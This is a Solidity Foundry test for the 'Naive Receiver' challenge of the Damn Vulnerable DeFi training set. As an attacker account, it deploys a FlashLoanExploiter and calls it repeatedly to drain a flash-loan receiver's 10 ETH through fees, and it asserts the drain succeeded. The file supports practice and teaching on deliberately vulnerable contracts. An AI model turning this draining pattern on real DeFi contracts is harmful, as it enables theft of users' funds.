// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {FlashLoanExploiter} from "../../../src/Contracts/naive-receiver/FlashLoanExploiter.sol";

contract NaiveReceiver is Test {
    uint256 private constant ETHER_IN_POOL = 1_000e18;
    uint256 private constant ETHER_IN_RECEIVER = 10e18;
    uint256 private constant FEES = 1e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    FlashLoanExploiter internal flashLoanExploiter;

    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        attacker = users[0];
        someUser = users[1];

        vm.label(attacker, "Attacker");
        vm.label(someUser, "SomeUser");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(address(naiveReceiverLenderPool), "NRLP");
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), FEES);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "FLR");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // need to find a way to bypass nonreantrant to call 10 times
        flashLoanExploiter = new FlashLoanExploiter(
            payable(naiveReceiverLenderPool),
            address(flashLoanReceiver)
        );

        flashLoanExploiter.attack();
        flashLoanExploiter.attack();
        flashLoanExploiter.attack();
        flashLoanExploiter.attack();
        flashLoanExploiter.attack();

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}
